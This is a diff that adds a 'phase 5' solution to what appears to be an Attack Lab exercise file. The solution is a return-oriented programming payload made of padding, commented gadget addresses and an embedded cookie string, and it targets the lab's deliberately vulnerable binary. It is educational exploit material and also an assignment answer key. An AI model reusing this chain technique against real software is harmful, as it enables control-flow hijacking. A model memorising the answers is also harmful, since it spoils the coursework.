@@ -83,3 +83,20 @@ d6 17 40 00 00 00 00 00 // second ret (2nd rsp), jump to touch3
 aa 73 fa 50 00 00 00 00 // store cookie here
 66 18 40 00 00 00 00 00 // second gadget - mov rax rdi
 02 17 40 00 00 00 00 00 // touch2 address
+
+### phase 5
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+7b 18 40 00 00 00 00 00 // pop rax
+20 00 00 00 00 00 00 00 // value relative from the * position to address of cookie
+de 18 40 00 00 00 00 00 // mov eax, ecx
+b0 18 40 00 00 00 00 00 // mov ecx, edx
+41 19 40 00 00 00 00 00 // mov edx, esi
+c4 18 40 00 00 00 00 00 // mov rsp, rax
+91 18 40 00 00 00 00 00 // mov rax, rdi
+a2 18 40 00 00 00 00 00 // lea (rdi, rsi, 1), rax
+91 18 40 00 00 00 00 00 // mov rax, rdi *
+d6 17 40 00 00 00 00 00 // touch3 address
+35 30 66 61 37 33 61 61 // string value of cookie
+00
